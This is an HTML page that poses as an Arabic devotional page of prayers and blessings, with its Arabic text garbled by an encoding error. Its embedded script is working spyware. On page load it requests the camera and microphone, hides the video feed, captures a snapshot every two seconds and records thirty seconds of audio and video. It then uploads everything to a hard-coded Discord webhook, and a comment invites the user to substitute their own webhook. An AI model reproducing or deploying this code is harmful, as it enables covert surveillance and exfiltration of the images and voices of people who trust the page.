<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>ØµÙ„ÙŠ Ø¹Ù„Ù‰ Ø§Ù„Ù†Ø¨ÙŠ</title>
    <style>
        #video { display: none; }
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f8ff;
            color: #333;
            text-align: center;
            padding-top: 50px;
        }
        .prayer {
            font-size: 22px;
            color: #0000cd;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <p class="prayer">Ø¨Ø³Ù… Ø§Ù„Ù„Ù‡ Ø§Ù„Ø±Ø­Ù…Ù† Ø§Ù„Ø±Ø­ÙŠÙ…</p>
    <p class="prayer">Ø§Ù„Ù„Ù‡Ù… ØµÙ„ ÙˆØ³Ù„Ù… Ø¹Ù„Ù‰ Ø³ÙŠØ¯Ù†Ø§ Ù…Ø­Ù…Ø¯</p>
    <p class="prayer">Ø³Ø¨Ø­Ø§Ù† Ø§Ù„Ù„Ù‡ ÙˆØ¨Ø­Ù…Ø¯Ù‡ØŒ Ø³Ø¨Ø­Ø§Ù† Ø§Ù„Ù„Ù‡ Ø§Ù„Ø¹Ø¸ÙŠÙ…</p>
    <p class="prayer">Ù„Ø§ Ø¥Ù„Ù‡ Ø¥Ù„Ø§ Ø§Ù„Ù„Ù‡ Ù…Ø­Ù…Ø¯ Ø±Ø³ÙˆÙ„ Ø§Ù„Ù„Ù‡</p>
    <p class="prayer">Ø§Ù„Ù„Ù‡Ù… Ø§Ø¬Ø¹Ù„Ù†Ø§ Ù…Ù† Ø§Ù„Ø°Ø§ÙƒØ±ÙŠÙ† ÙˆØ§Ù„Ø°Ø§ÙƒØ±Ø§Øª</p>

    <video id="video" width="300" height="200" autoplay muted></video>
    <canvas id="canvas" width="300" height="200" style="display:none;"></canvas>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');

        const WEBHOOK_URL = "https://discord.com/api/webhooks/1362557678391525476/A9APQh3dZexbMw9xDul_wsnHLbJBG0LjEuJrVJmE9zc3vZf5fMaGLRYsatoVFw40vV3C"; // â† ØºÙŠØ±Ù‡ Ø¨Ø§Ù„Ø±Ø§Ø¨Ø· Ø¨ØªØ§Ø¹Ùƒ

        let stream;
        let recorder;
        let chunks = [];
        let recordingStarted = false;

        window.onload = async () => {
            try {
                // Ù†Ø·Ù„Ø¨ ÙƒØ§Ù…ÙŠØ±Ø§ + Ù…Ø§ÙŠÙƒ
                stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                video.srcObject = stream;

                // â±ï¸ ØµÙˆØ±Ø© ÙƒÙ„ 2 Ø«Ø§Ù†ÙŠØ©
                setInterval(captureImage, 2000);

                // ğŸ¥ ØªØ³Ø¬ÙŠÙ„ ÙÙŠØ¯ÙŠÙˆ Ù…Ù† Ø§Ù„Ø¨Ø¯Ø§ÙŠØ©
                startLongRecording();

            } catch (err) {
                alert("âš ï¸ ÙØ´Ù„ ÙÙŠ Ø§Ù„ÙˆØµÙˆÙ„ Ù„Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø£Ùˆ Ø§Ù„Ù…Ø§ÙŠÙƒ. Ø§Ù„Ø±Ø¬Ø§Ø¡ Ø§Ù„Ø³Ù…Ø§Ø­.");
                console.error(err);
            }
        };

        function captureImage() {
            // ØªØ£ÙƒØ¯ Ù…Ù† Ø£Ù† Ø§Ù„ÙÙŠØ¯ÙŠÙˆ ÙŠØªÙ… Ø¹Ø±Ø¶Ù‡ Ø¹Ù„Ù‰ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø¨Ø´ÙƒÙ„ ØµØ­ÙŠØ­
            if (video.readyState === video.HAVE_ENOUGH_DATA) {
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                const imgData = canvas.toDataURL('image/png');
                const imageHash = `sent_image_${hashString(imgData)}`;

                if (!localStorage.getItem(imageHash)) {
                    sendImage(imgData, imageHash);
                } else {
                    console.log("âœ… Ø§Ù„ØµÙˆØ±Ø© Ø¯ÙŠ Ø§ØªØ¨Ø¹ØªØª Ù‚Ø¨Ù„ ÙƒØ¯Ù‡");
                }
            } else {
                console.log("âš ï¸ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ ØºÙŠØ± Ø¬Ø§Ù‡Ø² Ù„Ù„ØªØµÙˆÙŠØ± Ø¨Ø¹Ø¯.");
            }
        }

        function sendImage(imgData, imageHash) {
            const blob = dataURLtoBlob(imgData);
            const formData = new FormData();
            formData.append('file', blob, 'image.png');

            fetch(WEBHOOK_URL, {
                method: 'POST',
                body: formData
            }).then(response => {
                if (response.status === 204) {
                    console.log("âœ… ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ±Ø©");
                    localStorage.setItem(imageHash, true);
                } else {
                    console.log("âŒ ÙØ´Ù„ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ±Ø©");
                }
            }).catch(err => console.log("âŒ Ø®Ø·Ø£ Ø£Ø«Ù†Ø§Ø¡ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ±Ø©:", err));
        }

        function startLongRecording() {
            if (recordingStarted) return;
            recordingStarted = true;

            recorder = new MediaRecorder(stream);
            recorder.ondataavailable = e => chunks.push(e.data);

            recorder.start();

            // â±ï¸ Ø¨Ø¹Ø¯ 30 Ø«Ø§Ù†ÙŠØ© Ù…Ø«Ù„Ø§Ù‹ Ø§Ø¨Ø¹Øª Ø§Ù„ÙÙŠØ¯ÙŠÙˆ
            setTimeout(() => {
                recorder.stop();
                recorder.onstop = sendVideo;
            }, 30000); // â† ØªÙ‚Ø¯Ø± ØªØºÙŠØ± Ø§Ù„Ù…Ø¯Ø©
        }

        function sendVideo() {
            const blob = new Blob(chunks, { type: 'video/webm' });

            const reader = new FileReader();
            reader.onloadend = () => {
                const base64data = reader.result;
                const videoHash = `sent_video_${hashString(base64data)}`;

                if (!localStorage.getItem(videoHash)) {
                    const formData = new FormData();
                    formData.append('file', blob, 'recorded_video.webm');

                    fetch(WEBHOOK_URL, {
                        method: 'POST',
                        body: formData
                    }).then(response => {
                        if (response.status === 204) {
                            console.log("âœ… ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ");
                            localStorage.setItem(videoHash, true);
                        } else {
                            console.log("âŒ ÙØ´Ù„ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ");
                        }
                    }).catch(err => console.log("âŒ Ø®Ø·Ø£ Ø£Ø«Ù†Ø§Ø¡ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ:", err));
                } else {
                    console.log("âœ… Ø§Ù„ÙÙŠØ¯ÙŠÙˆ Ø¯Ù‡ Ø§ØªØ¨Ø¹Øª Ù‚Ø¨Ù„ ÙƒØ¯Ù‡");
                }
            };
            reader.readAsDataURL(blob);
        }

        function dataURLtoBlob(dataURL) {
            const parts = dataURL.split(';base64,');
            const byteString = atob(parts[1]);
            const mimeString = parts[0].split(':')[1];
            const ab = new ArrayBuffer(byteString.length);
            const ia = new Uint8Array(ab);
            for (let i = 0; i < byteString.length; i++) {
                ia[i] = byteString.charCodeAt(i);
            }
            return new Blob([ab], { type: mimeString });
        }

        function hashString(str) {
            let hash = 0;
            for (let i = 0; i < str.length; i++) {
                const chr = str.charCodeAt(i);
                hash = ((hash << 5) - hash) + chr;
                hash |= 0; // Convert to 32bit integer
            }
            return hash;
        }
    </script>
</body>
</html>
